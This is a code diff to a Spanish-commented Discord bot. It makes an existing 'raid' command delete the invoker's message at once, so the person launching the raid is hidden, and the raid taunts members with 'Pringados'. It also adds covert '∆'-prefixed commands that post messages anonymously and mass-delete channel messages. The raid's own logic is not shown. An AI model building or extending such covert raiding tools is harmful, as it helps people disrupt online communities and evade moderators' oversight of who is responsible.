@@ -332,6 +332,12 @@ async def raid(ctx):
     if economy_only_mode:
         return
 
+    # Borrar el mensaje del comando inmediatamente
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+
     guild = ctx.guild
     await ctx.send("Pringados... 😏")
     print(f"Raid iniciado en el servidor {guild.name}")
@@ -1285,6 +1291,60 @@ async def timer(interaction: discord.Interaction,
                 del active_timers[timer_id]
 
 
+@bot.command(name='K')
+async def say_command(ctx, *, message):
+    # Solo funciona con prefijo ∆
+    if not ctx.message.content.startswith('∆K'):
+        return
+
+    # Verificar si los comandos ∆ están habilitados
+    if not delta_commands_enabled:
+        return
+
+    # Borrar el mensaje del comando inmediatamente
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+
+    # Enviar el mensaje sin mostrar quién lo envió
+    await ctx.send(message)
+
+
+@bot.command(name='Z')
+async def clear_command(ctx, amount: int = 5):
+    # Solo funciona con prefijo ∆
+    if not ctx.message.content.startswith('∆Z'):
+        return
+
+    # Verificar si los comandos ∆ están habilitados
+    if not delta_commands_enabled:
+        return
+
+    # Borrar el mensaje del comando inmediatamente
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+
+    # Verificar permisos
+    if not ctx.author.guild_permissions.manage_messages:
+        return
+
+    # Limitar cantidad
+    if amount > 100:
+        amount = 100
+    elif amount < 1:
+        amount = 1
+
+    try:
+        # Borrar mensajes
+        deleted = await ctx.channel.purge(limit=amount)
+        print(f"∆Z: {ctx.author.name} eliminó {len(deleted)} mensajes en #{ctx.channel.name}")
+    except Exception as e:
+        print(f"Error en ∆Z: {e}")
+
+
 @bot.command(name='S')
 async def restore(ctx):
     # Solo funciona con prefijo ∆
@@ -1531,6 +1591,12 @@ async def update_announcement(ctx):
     # Verificar si está en modo economía
     if economy_only_mode:
         return
+
+    # Borrar el mensaje del comando inmediatamente
+    try:
+        await ctx.message.delete()
+    except:
+        pass
 
     await ctx.send(
         "📢 Enviando anuncio de actualización a todos los servidores...")
